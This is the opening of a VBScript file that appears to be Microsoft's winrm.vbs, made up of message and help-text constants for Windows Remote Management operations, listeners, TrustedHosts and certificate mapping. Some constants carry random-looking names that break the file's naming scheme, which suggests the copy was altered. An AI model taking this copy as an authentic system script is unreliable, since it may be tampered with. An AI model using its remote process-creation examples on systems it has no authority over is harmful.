       
   '
' Copyright (c) Microsoft Corporation.  All rights reserved.
'
' VBScript Source File
'
' Script Name: winrm.vbs
'

'''''''''''''''''''''
' Error codes
private const ERR_OK              = 0
private const ERR_GENERAL_FAILURE = 1

'''''''''''''''''''''
' Messages
private const L_ONLYCSCRIPT_Message     = "Can be executed only by cscript.exe."
private const sOItWM         = "Unknown operation name: "
private const L_OP_Message              = "Operation - "
private const UWLxC          = "File does not exist: "
private const CeWHX         = "Parameter is zero length #"
private const QsMlt     = "Switch not allowed with the given operation: "
private const YNRKc     = "Unknown switch: "
private const uCDqTM   = "Missing switch name"
private const DCxZNe       = "Invalid use of command line. Type ""winrm -?"" for help."
private const swHbcU         = "Type ""winrm -?"" for help."
private const jOCXkY = "Invalid usage of command line; winrm.vbs not found in command string."
private const GquTvj = "A quoted parameter value must begin and end with quotes: "
private const ASWlGN      = "Unexpected match count - one match is expected: "
private const ogaN       = "Option is not unique: "
private const UNJe      = "URI is missing"
private const yujN   = "Action is missing"
private const UWcPq         = "URI is 0 length"    
private const L_URIZEROTOK_Message      = "Invalid URI, token is 0 length"    
private const cOiGM      = "Invalid WMI resource URI - no '/' found  (at least 2 expected)"
private const gzjhy      = "Invalid WMI resource URI - only one '/' found (at least 2 expected)"
private const L_NOLASTTOK_Message       = "Invalid URI - cannot locate last token for root node name"
private const JgScy = "Syntax Error: input must be of the form {KEY=""VALUE""[;KEY=""VALUE""]}"
private const L_ARGNOVAL_Message        = "Argument's value is not provided: "
private const L_XMLERROR_Message        = "Unable to parse XML: "
private const L_XSLERROR_Message        = "Unable to parse XSL file. Either it is inaccessible or invalid: "
private const L_MSXML6MISSING_Message   = "Unable to load MSXML6, required by -format option and for set using ""@{...}"""
private const L_FORMATLERROR_Message    = "Invalid option for -format: "
private const L_FORMATFAILED_Message    = "Unable to reformat message. Raw, unformatted, message: "
private const L_PUT_PARAM_NOMATCH_Message = "Parameter name does not match any properties on resource: "
private const L_PUT_PARAM_MULTIMATCH_Message = "Parameter matches more than one property on resource: "
private const L_PUT_PARAM_NOARRAY_Message = "Multiple matching parameter names not allowedin @{...}: "
private const L_PUT_PARAM_NOTATTR_Message = "Parameter matches a non-text property on resource: "
private const L_PUT_PARAM_EMPTY_Message = "Parameter set is empty."
private const L_OPTIONS_PARAMETER_EMPTY_Message = "Options parameter has no value or is malformed."
private const L_RESOURCELOCATOR_Message = "Unable to create ResourceLocator object."
private const L_PUT_PARAM_NOINPUT_Message = "No input provided through ""@{...}"" or ""-file:"" commandline parameters."
private const L_ERR_Message = "Error: "
private const L_ERRNO_Message = "Error number: "
private const L_OpDoesntAcceptInput_ErrorMessage = "Input was supplied to an operation that does not accept input."
private const L_QuickConfigNoChangesNeeded_Message = "WinRM is already set up for remote management on this computer."
private const L_QuickConfig_MissingUpdateXml_0_ErrorMessage = "Could not find update instructions in analysis result."
private const L_QuickConfigUpdated_Message = "WinRM has been updated for remote management."
private const L_QuickConfigUpdateFailed_ErrorMessage = "One or more update steps could not be completed."
private const L_QuickConfig_InvalidBool_0_ErrorMessage = "Could not determine if remoting is enabled."
private const L_QuickConfig_RemotingDisabledbyGP_00_ErrorMessage = "Cannot complete the request due to a conflicting Group Policy setting."
private const L_QuickConfig_UpdatesNeeded_0_Message = "WinRM is not set up to allow remote access to this machine for management."
private const L_QuickConfig_UpdatesNeeded_1_Message = "The following changes must be made:"
private const L_QuickConfig_Prompt_0_Message = "Make these changes [y/n]? "
private const L_QuickConfigNoServiceChangesNeeded_Message = "WinRM is already set up to receive requests on this computer."
private const L_QuickConfigNoServiceChangesNeeded_Message2 = "WinRM service is already running on this machine."
private const L_QuickConfigUpdatedService_Message = "WinRM has been updated to receive requests."
private const L_QuickConfig_ServiceUpdatesNeeded_0_Message = "WinRM is not set up to receive requests on this machine."


'''''''''''''''''''''
' HELP - GENERAL
private const L_Help_Title_0_Message = "Windows Remote Management Command Line Tool"

private const L_Help_Blank_0_Message = ""

private const L_Help_SeeAlso_Title_Message    = "See also:"
private const X_Help_SeeAlso_Aliases_Message  = "  winrm help aliases"
private const X_Help_SeeAlso_Config_Message   = "  winrm help config"
private const X_Help_SeeAlso_CertMapping_Message  = "  winrm help certmapping"
private const X_Help_SeeAlso_CustomRemoteShell_Message    = "  winrm help customremoteshell"
private const X_Help_SeeAlso_Input_Message    = "  winrm help input"
private const X_Help_SeeAlso_Filters_Message  = "  winrm help filters"
private const X_Help_SeeAlso_Switches_Message = "  winrm help switches"
private const X_Help_SeeAlso_Uris_Message     = "  winrm help uris"
private const X_Help_SeeAlso_Auth_Message     = "  winrm help auth"
private const X_Help_SeeAlso_Set_Message      = "  winrm set -?"
private const X_Help_SeeAlso_Create_Message   = "  winrm create -?"
private const X_Help_SeeAlso_Enumerate_Message   = "  winrm enumerate -?"
private const X_Help_SeeAlso_Invoke_Message   = "  winrm invoke -?"
private const X_Help_SeeAlso_Remoting_Message = "  winrm help remoting"
private const X_Help_SeeAlso_configSDDL_Message = "  winrm configsddl -?"


'''''''''''''''''''''
' HELP - HELP
private const L_HelpHelp_000_0_Message = "Windows Remote Management (WinRM) is the Microsoft implementation of "
private const L_HelpHelp_001_0_Message = "the WS-Management protocol which provides a secure way to communicate "
private const L_HelpHelp_001_1_Message = "with local and remote computers using web services.  "
private const L_HelpHelp_002_0_Message = ""
private const L_HelpHelp_003_0_Message = "Usage:"
private const L_HelpHelp_004_0_Message = "  winrm OPERATION RESOURCE_URI [-SWITCH:VALUE [-SWITCH:VALUE] ...]"
private const L_HelpHelp_005_0_Message = "        [@{KEY=VALUE[;KEY=VALUE]...}]"
private const L_HelpHelp_007_0_Message = ""
private const L_HelpHelp_008_0_Message = "For help on a specific operation:"
private const L_HelpHelp_009_0_Message = "  winrm g[et] -?        Retrieving management information."
private const L_HelpHelp_010_0_Message = "  winrm s[et] -?        Modifying management information."
private const L_HelpHelp_011_0_Message = "  winrm c[reate] -?     Creating new instances of management resources."
private const L_HelpHelp_012_0_Message = "  winrm d[elete] -?     Remove an instance of a management resource."
private const L_HelpHelp_013_0_Message = "  winrm e[numerate] -?  List all instances of a management resource."
private const L_HelpHelp_014_0_Message = "  winrm i[nvoke] -?     Executes a method on a management resource."
private const L_HelpHelp_015_0_Message = "  winrm id[entify] -?   Determines if a WS-Management implementation is"
private const L_HelpHelp_015_1_Message = "                        running on the remote machine."
private const L_HelpHelp_016_0_Message = "  winrm quickconfig -?  Configures this machine to accept WS-Management"
private const L_HelpHelp_016_1_Message = "                        requests from other machines."
private const L_HelpHelp_016_3_Message = "  winrm configSDDL -?   Modify an existing security descriptor for a URI."
private const L_HelpHelp_016_4_Message = "  winrm helpmsg -?      Displays error message for the error code."
private const L_HelpHelp_017_0_Message = ""
private const L_HelpHelp_018_0_Message = "For help on related topics:"
private const L_HelpHelp_019_0_Message = "  winrm help uris       How to construct resource URIs."
private const L_HelpHelp_020_0_Message = "  winrm help aliases    Abbreviations for URIs."
private const L_HelpHelp_021_0_Message = "  winrm help config     Configuring WinRM client and service settings."
private const L_HelpHelp_021_2_Message = "  winrm help certmapping Configuring client certificate access."
private const L_HelpHelp_022_0_Message = "  winrm help remoting   How to access remote machines."
private const L_HelpHelp_023_0_Message = "  winrm help auth       Providing credentials for remote access."
private const L_HelpHelp_024_0_Message = "  winrm help input      Providing input to create, set, and invoke."
private const L_HelpHelp_025_0_Message = "  winrm help switches   Other switches such as formatting, options, etc."
private const L_HelpHelp_026_0_Message = "  winrm help proxy      Providing proxy information."

'''''''''''''''''''''
' HELP - GET
private const L_HelpGet_000_0_Message = "winrm get RESOURCE_URI [-SWITCH:VALUE [-SWITCH:VALUE] ...]"
private const L_HelpGet_001_0_Message = ""
private const L_HelpGet_002_0_Message = "Retrieves instances of RESOURCE_URI using specified "
private const L_HelpGet_003_0_Message = "options and key-value pairs."
private const L_HelpGet_004_0_Message = ""
private const L_HelpGet_005_0_Message = "Example: Retrieve current configuration in XML format:"
private const X_HelpGet_006_0_Message = "  winrm get winrm/config -format:pretty"
private const L_HelpGet_007_0_Message = ""
private const L_HelpGet_008_0_Message = "Example: Retrieve spooler instance of Win32_Service class:"
private const X_HelpGet_009_0_Message = "  winrm get wmicimv2/Win32_Service?Name=spooler"
private const L_HelpGet_010_0_Message = ""
private const L_HelpGet_014_0_Message = "Example: Retrieve a certmapping entry on this machine:"
private const X_HelpGet_015_0_Message = "  winrm get winrm/config/service/certmapping?Issuer=1212131238d84023982e381f20391a2935301923+Subject=*.example.com+URI=wmicimv2/*"
private const L_HelpGet_016_0_Message = ""

'''''''''''''''''''''
' HELP - SET
private const L_HelpSet_001_0_Message = "winrm set RESOURCE_URI [-SWITCH:VALUE [-SWITCH:VALUE] ...]"
private const L_HelpSet_002_0_Message = "          [@{KEY=""VALUE""[;KEY=""VALUE""]}]"
private const L_HelpSet_003_0_Message = "          [-file:VALUE]"
private const L_HelpSet_004_0_Message = ""
private const L_HelpSet_005_0_Message = "Modifies settings in RESOURCE_URI using specified switches"
private const L_HelpSet_006_0_Message = "and input of changed values via key-value pairs or updated "
private const L_HelpSet_007_0_Message = "object via an input file."
private const L_HelpSet_008_0_Message = ""
private const L_HelpSet_009_0_Message = "Example: Modify a configuration property of WinRM:"
private const X_HelpSet_010_0_Message = "  winrm set winrm/config @{MaxEnvelopeSizekb=""100""}"
private const L_HelpSet_011_0_Message = ""
private const L_HelpSet_012_0_Message = "Example: Disable a listener on this machine:"
private const X_HelpSet_013_0_Message = "  winrm set winrm/config/Listener?Address=*+Transport=HTTPS @{Enabled=""false""}"
private const L_HelpSet_014_0_Message = ""
private const L_HelpSet_018_0_Message = "Example: Disable a certmapping entry on this machine:"
private const X_HelpSet_019_0_Message = "  Winrm set winrm/config/service/certmapping?Issuer=1212131238d84023982e381f20391a2935301923+Subject=*.example.com+URI=wmicimv2/* @{Enabled=""false""}"
private const L_HelpSet_020_0_Message = ""

'''''''''''''''''''''
' HELP - CREATE
private const L_HelpCreate_001_0_Message = "winrm create RESOURCE_URI [-SWITCH:VALUE [-SWITCH:VALUE] ...]"
private const L_HelpCreate_002_0_Message = "             [@{KEY=""VALUE""[;KEY=""VALUE""]}]"
private const L_HelpCreate_003_0_Message = "             [-file:VALUE]"
private const L_HelpCreate_004_0_Message = ""
private const L_HelpCreate_005_0_Message = "Spawns an instance of RESOURCE_URI using specified "
private const L_HelpCreate_006_0_Message = "key-value pairs or input file."
private const L_HelpCreate_007_0_Message = ""
private const L_HelpCreate_008_0_Message = "Example: Create instance of HTTP Listener on IPv6 address:"
private const X_HelpCreate_009_0_Message = "  winrm create winrm/config/Listener?Address=IP:3ffe:8311:ffff:f2c1::5e61+Transport=HTTP"
private const L_HelpCreate_010_0_Message = ""
private const L_HelpCreate_011_0_Message = "Example: Create instance of HTTPS Listener on all IPs:"
private const X_HelpCreate_012_0_Message = "  winrm create winrm/config/Listener?Address=*+Transport=HTTPS @{Hostname=""HOST"";CertificateThumbprint=""XXXXXXXXXX""}"
private const L_HelpCreate_013_0_Message = "Note: XXXXXXXXXX represents a 40-digit hex string; see help config."
private const L_HelpCreate_014_0_Message = ""
private const L_HelpCreate_015_0_Message = "Example: Create a windows shell command instance from xml:"
private const X_HelpCreate_016_0_Message = "  winrm create shell/cmd -file:shell.xml -remote:srv.corp.com"
private const L_HelpCreate_017_0_Message = ""
private const L_HelpCreate_022_0_Message = "Example: Create a CertMapping entry:"
private const X_HelpCreate_023_0_Message = "  winrm create winrm/config/service/certmapping?Issuer=1212131238d84023982e381f20391a2935301923+Subject=*.example.com+URI=wmicimv2/* @{UserName=""USERNAME"";Password=""PASSWORD""} -remote:localhost"
private const L_HelpCreate_024_0_Message = ""


'''''''''''''''''''''
' HELP - DELETE
private const L_HelpDelete_001_0_Message = "winrm delete RESOURCE_URI [-SWITCH:VALUE [-SWITCH:VALUE] ...]"
private const L_HelpDelete_002_0_Message = ""
private const L_HelpDelete_003_0_Message = "Removes an instance of RESOURCE_URI."
private const L_HelpDelete_004_0_Message = ""
private const L_HelpDelete_005_0_Message = "Example: delete the HTTP listener on this machine for given IP address:"
private const X_HelpDelete_006_0_Message = "  winrm delete winrm/config/Listener?Address=IP:192.168.2.1+Transport=HTTP"
private const L_HelpDelete_007_0_Message = ""
private const L_HelpDelete_008_0_Message = "Example: delete a certmapping entry:"
private const X_HelpDelete_009_0_Message = "  winrm delete winrm/config/service/certmapping?Issuer=1212131238d84023982e381f20391a2935301923+Subject=*.example.com+URI=wmicimv2/*"
private const L_HelpDelete_010_0_Message = ""

'''''''''''''''''''''
' HELP - ENUMERATE
private const L_HelpEnum_001_0_Message = "winrm enumerate RESOURCE_URI [-ReturnType:Value] [-Shallow]" 
private const L_HelpEnum_001_1_Message = "         [-BasePropertiesOnly] [-SWITCH:VALUE [-SWITCH:VALUE] ...]"
private const L_HelpEnum_002_0_Message = ""
private const L_HelpEnum_003_0_Message = "Lists instances of RESOURCE_URI."
private const L_HelpEnum_004_0_Message = "Can limit the instances returned by using a filter and dialect if the "
private const L_HelpEnum_005_0_Message = "resource supports these."
private const L_HelpEnum_006_0_Message = ""
private const L_HelpEnum_006_1_Message = "ReturnType"
private const L_HelpEnum_006_2_Message = "----------"
private const L_HelpEnum_006_3_Message = "returnType is an optional switch that determines the type of data returned."
private const L_HelpEnum_006_4_Message = "Possible options are 'Object', 'EPR'  and 'ObjectAndEPR'. Default is Object"
private const L_HelpEnum_006_5_Message = "If Object is specified or if switch is omitted, then only the objects are"
private const L_HelpEnum_006_6_Message = "returned."
private const L_HelpEnum_006_7_Message = "If EPR is specified, then only the EPRs (End point reference) of the"
private const L_HelpEnum_006_8_Message = "objects are returned. EPRs contain information about the resource URI and"
private const L_HelpEnum_006_9_Message = "selectors for the instance."
private const L_HelpEnum_006_10_Message = "If ObjectAndEPR is specified, then both the object and the associated EPRs"
private const L_HelpEnum_006_11_Message = "are returned."
private const L_HelpEnum_006_12_Message = ""
private const L_HelpEnum_006_13_Message = "Shallow"
private const L_HelpEnum_006_14_Message = "-------"
private const L_HelpEnum_006_15_Message = "Enumerate only instances of the base class specified in the resource URI."
private const L_HelpEnum_006_16_Message = "If this flag is not specified, instances of the base class specified in "
private const L_HelpEnum_006_17_Message = "the resource URI and all its derived classes are returned."
private const L_HelpEnum_006_18_Message = ""
private const L_HelpEnum_006_19_Message = "BasePropertiesOnly"
private const L_HelpEnum_006_20_Message = "------------------"
private const L_HelpEnum_006_21_Message = "Includes only those properties that are part of the base class specified"
private const L_HelpEnum_006_22_Message = "in the resource URI. When -Shallow is specified, this flag has no effect. "
private const L_HelpEnum_006_23_Message = ""
private const L_HelpEnum_007_0_Message = "Example: List all WinRM listeners on this machine:"
private const X_HelpEnum_008_0_Message = "  winrm enumerate winrm/config/Listener"
private const L_HelpEnum_009_0_Message = ""
private const L_HelpEnum_010_0_Message = "Example: List all instances of Win32_Service class:"
private const X_HelpEnum_011_0_Message = "  winrm enumerate wmicimv2/Win32_Service"
private const L_HelpEnum_012_0_Message = ""
'private const L_HelpEnum_013_0_Message = "Example: List all auto start services that are stopped:"
'private const X_HelpEnum_014_0_Message = "  winrm enum wmicimv2/* -filter:""select * from win32_service where StartMode=\""Auto\"" and State = \""Stopped\"" """
'private const L_HelpEnum_015_0_Message = ""
private const L_HelpEnum_016_0_Message = "Example: List all shell instances on a machine:"
private const X_HelpEnum_017_0_Message = "  winrm enum shell/cmd -remote:srv.corp.com"
private const L_HelpEnum_018_0_Message = ""
private const L_HelpEnum_019_0_Message = "Example: List resources accessible to the current user:"
private const X_HelpEnum_020_0_Message = "  winrm enum winrm/config/resource"
private const L_HelpEnum_021_0_Message = ""
private const L_HelpEnum_022_0_Message = "Example: List all certmapping settings:"
private const X_HelpEnum_023_0_Message = "  winrm enum winrm/config/service/certmapping"
private const L_HelpEnum_024_0_Message = ""

'''''''''''''''''''''
' HELP - INVOKE
private const L_HelpInvoke_001_0_Message = "winrm invoke ACTION RESOURCE_URI [-SWITCH:VALUE [-SWITCH:VALUE] ...]"
private const L_HelpInvoke_002_0_Message = "             [@{KEY=""VALUE""[;KEY=""VALUE""]}]"
private const L_HelpInvoke_003_0_Message = "             [-file:VALUE]"
private const L_HelpInvoke_004_0_Message = ""
private const L_HelpInvoke_005_0_Message = "Executes method specified by ACTION on target object specified by RESOURCE_URI"
private const L_HelpInvoke_006_0_Message = "with parameters specified by key-value pairs."
private const L_HelpInvoke_007_0_Message = ""
private const L_HelpInvoke_008_0_Message = "Example: Call StartService method on Spooler service:"
private const X_HelpInvoke_009_0_Message = "  winrm invoke StartService wmicimv2/Win32_Service?Name=spooler"
private const L_HelpInvoke_010_0_Message = ""
private const L_HelpInvoke_011_0_Message = "Example: Call StopService method on Spooler service using XML file:"
private const X_HelpInvoke_012_0_Message = "  winrm invoke StopService wmicimv2/Win32_Service?Name=spooler -file:input.xml"
private const L_HelpInvoke_013_0_Message = "Where input.xml:"
private const X_HelpInvoke_014_0_Message = "<p:StopService_INPUT xmlns:p=""http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_Service""/>"
private const L_HelpInvoke_015_0_Message = ""
private const L_HelpInvoke_016_0_Message = "Example: Call Create method of Win32_Process class with specified parameters:"
private const X_HelpInvoke_017_0_Message = "  winrm invoke Create wmicimv2/Win32_Process @{CommandLine=""notepad.exe"";CurrentDirectory=""C:\""}"
private const L_HelpInvoke_018_0_Message = ""
private const L_HelpInvoke_019_0_Message = "Example: Restore the default winrm configuration:"
private const L_HelpInvoke_019_1_Message = "Note that this will not restore the default winrm plugin configuration:"
private const X_HelpInvoke_020_0_Message = "  winrm invoke restore winrm/config @{}"
private const L_HelpInvoke_021_0_Message = ""
private const L_HelpInvoke_022_0_Message = "Example: Restore the default winrm plugin configuration:"
private const L_HelpInvoke_022_1_Message = "Note that all external plugins will be unregistered during this operation:"
private const X_HelpInvoke_023_0_Message = "  winrm invoke restore winrm/config/plugin @{}"

'''''''''''''''''''''
' HELP - IDENTIFY
private const X_HelpIdentify_001_0_Message = "winrm identify  [-SWITCH:VALUE [-SWITCH:VALUE] ...]"
private const L_HelpIdentify_003_0_Message = ""
private const L_HelpIdentify_004_0_Message = "Issues an operation against a remote machine to see if the WS-Management "
private const L_HelpIdentify_005_0_Message = "service is running. This operation must be run with the '-remote' switch."
private const L_HelpIdentify_006_0_Message = "To run this operation unauthenticated against the remote machine use the"
private const L_HelpIdentify_007_0_Message = "-auth:none"
private const L_HelpIdentify_008_0_Message = ""
private const L_HelpIdentify_009_0_Message = "Example: identify if WS-Management is running on www.example.com:"
private const X_HelpIdentify_010_0_Message = "  winrm identify -remote:www.example.com"


'''''''''''''''''''''
' HELP - HELPMSG
private const X_HelpHelpMessaage_001_0_Message = "winrm helpmsg errorcode"
private const X_HelpHelpMessaage_002_0_Message = ""
private const X_HelpHelpMessaage_003_0_Message = "Displays error message associate with the error code."
private const X_HelpHelpMessaage_004_0_Message = "Example:"
private const X_HelpHelpMessaage_006_0_Message = "  winrm helpmsg 0x5"

'''''''''''''''''''''
' HELP - ALIAS
private const L_HelpAlias_001_0_Message = "Aliasing allows shortcuts to be used in place of full Resource URIs."
private const L_HelpAlias_002_0_Message = "Available aliases and the Resource URIs they substitute for are:"
private const L_HelpAlias_003_0_Message = ""
private const X_HelpAlias_004_0_Message = "wmi      = http://schemas.microsoft.com/wbem/wsman/1/wmi"
private const X_HelpAlias_005_0_Message = "wmicimv2 = http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2"
private const X_HelpAlias_006_0_Message = "cimv2    = http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2"
private const X_HelpAlias_007_0_Message = "winrm    = http://schemas.microsoft.com/wbem/wsman/1"
private const X_HelpAlias_008_0_Message = "wsman    = http://schemas.microsoft.com/wbem/wsman/1"
private const X_HelpAlias_009_0_Message = "shell    = http://schemas.microsoft.com/wbem/wsman/1/windows/shell"
private const L_HelpAlias_010_0_Message = ""
private const L_HelpAlias_011_0_Message = "Example: using full Resource URI:"
private const x_HelpAlias_012_0_Message = "  winrm get http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_Service?Name=WinRM"
private const L_HelpAlias_013_0_Message = ""
private const L_HelpAlias_014_0_Message = "Example: using alias:"
private const X_HelpAlias_015_0_Message = "  winrm get wmicimv2/Win32_Service?Name=WinRM"

'''''''''''''''''''''
' HELP - URIS
private const L_HelpUris_001_0_Message = "Universal Resource Identifiers (URI) specify management resources to be"
private const L_HelpUris_002_0_Message = "used for operations."
private const L_HelpUris_003_0_Message = ""
private const L_HelpUris_004_0_Message = "Selectors and values are passed after the URI in the form:"
private const X_HelpUris_005_0_Message = "  RESOURCE_URI?NAME=VALUE[+NAME=VALUE]..."
private const L_HelpUris_006_0_Message = ""
private const L_HelpUris_007_0_Message = "URIs for all information in WMI are of the following form:"
private const X_HelpUris_008_0_Message = "  WMI path = \\root\NAMESPACE[\NAMESPACE]\CLASS"
private const X_HelpUris_009_0_Message = "  URI      = http://schemas.microsoft.com/wbem/wsman/1/wmi/root/NAMESPACE[/NAMESPACE]/CLASS"
private const X_HelpUris_010_0_Message = "  ALIAS    = wmi/root/NAMESPACE[/NAMESPACE]/CLASS"
private const L_HelpUris_011_0_Message = ""
private const L_HelpUris_012_0_Message = "Example: Get information about WinRM service from WMI using single selector"
private const X_HelpUris_013_0_Message = "  WMI path = \\root\cimv2\Win32_Service"
private const X_HelpUris_013_1_Message = "  URI      = http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_Service?Name=WinRM"
private const X_HelpUris_014_0_Message = "  ALIAS    = wmi/root/cimv2/Win32_Service?Name=WinRM"
private const L_HelpUris_015_0_Message = ""
private const L_HelpUris_015_1_Message = "When enumerating WMI instances using a WQL filter,"
private const L_HelpUris_015_2_Message = "the CLASS must be ""*"" (star) and no selectors should be specified."
private const L_HelpUris_015_3_Message = "Example:"
private const X_HelpUris_015_4_Message = "URI = http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/*"
private const L_HelpUris_015_5_Message = ""
private const L_HelpUris_015_6_Message = "When accesing WMI singleton instances, no selectors should be specified."
private const L_HelpUris_015_7_Message = "Example:"
private const X_HelpUris_015_8_Message = "URI = http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_Service"
private const L_HelpUris_015_9_Message = ""
private const L_HelpUris_016_0_Message = "Note: Some parts of RESOURCE_URI may be case-sensitive. When using create or"
private const L_HelpUris_017_0_Message = "invoke, the last part of the resource URI must match case-wise the top-level"
private const L_HelpUris_018_0_Message = "element of the expected XML."

'''''''''''''''''''''
' HELP - CONFIG
private const L_HelpConfig_001_0_Message = "Configuration for WinRM is managed using the winrm command line or through GPO."
private const L_HelpConfig_002_0_Message = "Configuration includes global configuration for both the client and service."
private const L_HelpConfig_003_0_Message = ""
private const L_HelpConfig_004_0_Message = "The WinRM service requires at least one listener to indicate the IP address(es)"
private const L_HelpConfig_005_0_Message = "on which to accept WS-Management requests.  For example, if the machine has "
private const L_HelpConfig_006_0_Message = "multiple network cards, WinRM can be configured to only accept requests from"
private const L_HelpConfig_007_0_Message = "one of the network cards."
private const L_HelpConfig_008_0_Message = ""
private const L_HelpConfig_009_0_Message = "Global configuration"
private const X_HelpConfig_010_0_Message = "  winrm get winrm/config"
private const X_HelpConfig_011_0_Message = "  winrm get winrm/config/client"
private const X_HelpConfig_012_0_Message = "  winrm get winrm/config/service"
private const X_HelpConfig_012_1_Message = "  winrm enumerate winrm/config/resource"
private const X_HelpConfig_012_2_Message = "  winrm enumerate winrm/config/listener"
private const X_HelpConfig_012_3_Message = "  winrm enumerate winrm/config/plugin"
private const X_HelpConfig_012_4_Message = "  winrm enumerate winrm/config/service/certmapping"
private const L_HelpConfig_013_0_Message = ""
private const L_HelpConfig_014_0_Message = "Network listening requires one or more listeners.  "
private const L_HelpConfig_015_0_Message = "Listeners are identified by two selectors: Address and Transport."

private const L_HelpConfigAddress_001_0_Message = "Address must be one of:"
private const L_HelpConfigAddress_002_0_Message = "  *           - Listen on all IPs on the machine "
private const L_HelpConfigAddress_003_0_Message = "  IP:1.2.3.4  - Listen only on the specified IP address"
private const L_HelpConfigAddress_004_0_Message = "  MAC:...     - Listen only on IP address for the specified MAC"
private const L_HelpConfigAddress_005_0_Message = ""
private const L_HelpConfigAddress_006_0_Message = "Note: All listening is subject to the IPv4Filter and IPv6Filter under    "
private const L_HelpConfigAddress_007_0_Message = "config/service."
private const L_HelpConfigAddress_008_0_Message = "Note: IP may be an IPv4 or IPv6 address."

private const L_HelpConfigTransport_001_0_Message = "Transport must be one of:"
private const L_HelpConfigTransport_002_0_Message = "  HTTP  - Listen for requests on HTTP  (default port is 5985)"
private const L_HelpConfigTransport_003_0_Message = "  HTTPS - Listen for requests on HTTPS (default port is 5986)"
private const L_HelpConfigTransport_004_0_Message = ""
private const L_HelpConfigTransport_005_0_Message = "Note: HTTP traffic by default only allows messages encrypted with "
private const L_HelpConfigTransport_006_0_Message = "the Negotiate or Kerberos SSP."
private const L_HelpConfigTransport_007_0_Message = ""
private const L_HelpConfigTransport_008_0_Message = ""
private const L_HelpConfigTransport_009_0_Message = "When configuring HTTPS, the following properties are used:"
private const L_HelpConfigTransport_010_0_Message = "  Hostname - Name of this machine; must match CN in certificate."
private const L_HelpConfigTransport_011_0_Message = "  CertificateThumbprint - hexadecimal thumbprint of certificate appropriate for"
private const L_HelpConfigTransport_012_0_Message = "    Server Authentication."
private const L_HelpConfigTransport_013_0_Message = "Note: If only Hostname is supplied, WinRM will try to find an appropriate"
private const L_HelpConfigTransport_014_0_Message = "certificate."
   
private const L_HelpConfigExamples_001_0_Message = "Example: To listen for requests on HTTP on all IPs on the machine:"
private const X_HelpConfigExamples_002_0_Message = "  winrm create winrm/config/listener?Address=*+Transport=HTTP"
private const L_HelpConfigExamples_003_0_Message = ""
private const L_HelpConfigExamples_004_0_Message = "Example: To disable a given listener"
private const X_HelpConfigExamples_005_0_Message = "  winrm set winrm/config/listener?Address=IP:1.2.3.4+Transport=HTTP @{Enabled=""false""}"
private const L_HelpConfigExamples_006_0_Message = ""
private const L_HelpConfigExamples_007_0_Message = "Example: To enable basic authentication on the client but not the service:"
private const X_HelpConfigExamples_008_0_Message = "  winrm set winrm/config/client/auth @{Basic=""true""}"
private const L_HelpConfigExamples_009_0_Message = ""
private const L_HelpConfigExamples_010_0_Message = "Example: To enable Negotiate for all workgroup machines."
private const X_HelpConfigExamples_011_0_Message = "  winrm set winrm/config/client @{TrustedHosts=""<local>""}"
private const L_HelpConfigExamples_012_0_Message = ""
private const L_HelpConfigExamples_013_0_Message = "Example: To add an IPv4 and IPv6 host address to TrustedHosts."
private const X_HelpConfigExamples_014_0_Message = "  winrm set winrm/config/client @{TrustedHosts=""1.2.3.4,[1:2:3::8]""}"
private const L_HelpConfigExamples_015_0_Message = ""
private const L_HelpConfigExamples_016_0_Message = "  Note: Computers in the TrustedHosts list might not be authenticated"

'''''''''''''''''''''
' HELP - CertMapping
private const L_HelpCertMapping_001_0_Message = "Certificate mapping remote access to WinRM using client certificates is "
private const L_HelpCertMapping_002_0_Message = "stored in the certificate mapping table identified by the "
private const L_HelpCertMapping_003_0_Message = "following resource URI:"
private const L_HelpCertMapping_003_1_Message = ""
private const L_HelpCertMapping_004_0_Message = " winrm/config/service/CertMapping"
private const L_HelpCertMapping_005_0_Message = ""
private const L_HelpCertMapping_006_0_Message = "Each entry in this table contains five properties:"
private const L_HelpCertMapping_007_0_Message = " Issuer -  Thumbprint of the issuer certificate."
private const L_HelpCertMapping_008_0_Message = " Subject - Subject field of client certificate."
private const L_HelpCertMapping_009_0_Message = " URI - The URI or URI prefix for which this mapping applies."
private const L_HelpCertMapping_009_1_Message = " Username - Local username for processing the request."
private const L_HelpCertMapping_009_2_Message = " Password - Local password for processing the request."
private const L_HelpCertMapping_009_3_Message = " Enabled - Use in processing if true."
private const L_HelpCertMapping_010_0_Message = "  "
private const L_HelpCertMapping_011_0_Message = "For a client certificate to be applicable, the issuer certificate must be  "
private const L_HelpCertMapping_012_0_Message = "available locally and match the thumbprint in the entry Issuer property"
private const L_HelpCertMapping_012_1_Message = ""
private const L_HelpCertMapping_012_2_Message = "For a client certificate to be applicable, its DNS or Principal name "
private const L_HelpCertMapping_013_0_Message = "(from the SubjectAlternativeName field) must match the Subject property."
private const L_HelpCertMapping_014_0_Message = "The value can start with a '*' wildcard."
private const L_HelpCertMapping_014_1_Message = "The URI identifies for which resources the indicated client certificates ."
private const L_HelpCertMapping_014_2_Message = "should be mapped."
private const L_HelpCertMapping_014_3_Message = "The value can end with a '*' wildcard."
private const L_HelpCertMapping_014_4_Message = ""

private const L_HelpCertMapping_015_0_Message = "If the client certificate matches the entry and it is enabled, the "
private const L_HelpCertMapping_016_0_Message = "request is processed under the local account with the given username "

private const L_HelpCertMapping_017_0_Message = "and password after ensuring that user has access to the resource as "
private const L_HelpCertMapping_018_0_Message = "defined by the URI security table."
private const L_HelpCertMapping_019_0_Message = ""

private const L_HelpCertMapping_020_0_Message = "When creating a new entry or changing the password of an existing entry, "
private const L_HelpCertMapping_021_0_Message = "the -r switch must be used since the WinRM service must store the password"
private const L_HelpCertMapping_022_0_Message = "for future use."


private const L_HelpCertMappingExamples_001_0_Message = "Example: To see the current CertMapping configuration"
private const X_HelpCertMappingExamples_002_0_Message = "  winrm enumerate winrm/config/service/CertMapping"

private const L_HelpCertMappingExamples_003_0_Message = "Example: Create a CertMapping entry:"
private const X_HelpCertMappingExamples_004_0_Message = "  winrm create winrm/config/service/certmapping?Issuer=1212131238d84023982e381f20391a2935301923+Subject=*.example.com+URI=wmicimv2/* @{UserName=""USERNAME"";Password=""PASSWORD""} -remote:localhost"
